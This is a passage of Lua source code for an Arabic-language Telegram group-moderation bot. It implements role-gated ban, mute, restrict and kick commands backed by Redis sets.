return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(darket.."BanAll:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanAll:Groups",UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^كتم عام @(%S+)$') then
local UserName = text:match('^كتم عام @(%S+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if Redis:sismember(darket.."ktmAll:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."ktmAll:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text then
if text:match('^الغاء كتم العام @(%S+)$') or text:match('^الغاء كتم عام @(%S+)$') then
local UserName = text:match('^الغاء كتم العام @(%S+)$') or text:match('^الغاء كتم عام @(%S+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(darket.."ktmAll:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."ktmAll:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
end
if text and text:match('^حظر @(%S+)$') then
local UserName = text:match('^حظر @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم حظره من الكروب ").Reply,"md",true)  
end
end
if text and text:match('^الغاء حظر @(%S+)$') then
local UserName = text:match('^الغاء حظر @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text and text:match('^كتم @(%S+)$') then
local UserName = text:match('^كتم @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusSilent(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم @(%S+)$') then
local UserName = text:match('^الغاء كتم @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(darket.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end
if text and text:match('^تقييد (%d+) (.*) @(%S+)$') then
local UserName = {text:match('^تقييد (%d+) (.*) @(%S+)$') }
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName[3])
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName[3] and UserName[3]:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if UserName[2] == 'يوم' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict * 86400
end
if UserName[2] == 'ساعه' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict * 3600
end
if UserName[2] == 'دقيقه' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict * 60
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تقييده في الكروب \n٠ لمدة : "..UserName[1]..' '..UserName[2]).Reply,"md",true)  
end

if text and text:match('^تقييد (%d+) (.*)$') and msg.reply_to_message_id ~= 0 then
local TimeKed = {text:match('^تقييد (%d+) (.*)$') }
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if TimeKed[2] == 'يوم' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TimeKed[2] == 'ساعه' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TimeKed[2] == 'دقيقه' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict * 60
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تقييده في الكروب \n٠ لمدة : "..TimeKed[1]..' '..TimeKed[2]).Reply,"md",true)  
end

if text and text:match('^تقييد (%d+) (.*) (%d+)$') then
local UserId = {text:match('^تقييد (%d+) (.*) (%d+)$') }
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId[3])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId[3]) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId[3]).." } *","md",true)  
end
if UserId[2] == 'يوم' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict * 86400
end
if UserId[2] == 'ساعه' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict * 3600
end
if UserId[2] == 'دقيقه' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict * 60
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId[3],'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return send(msg_chat_id,msg_id,Reply_Status(UserId[3],"\n٠ تم تقييده في الكروب \n٠ لمدة : "..UserId[1]..' ' ..UserId[2]).Reply,"md",true)  
end
if text and text:match('^تقييد @(%S+)$') then
local UserName = text:match('^تقييد @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
              end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تقييده في الكروب ").Reply,"md",true)  
end

if text and text:match('^الغاء التقييد @(%S+)$') then
local UserName = text:match('^الغاء التقييد @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم الغاء تقييده من الكروب").Reply,"md",true)  
end

if text and text:match('^طرد @(%S+)$') then
local UserName = text:match('^طرد @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم طرده من الكروب ").Reply,"md",true)  
end
if text == ('حظر عام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if Redis:sismember(darket.."BanAll:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanAll:Groups",Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text == ('الغاء العام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(darket.."BanAll:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanAll:Groups",Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text == ('كتم عام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if Redis:sismember(darket.."ktmAll:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."ktmAll:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text == ('الغاء كتم العام') or text == "الغاء كتم عام" and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
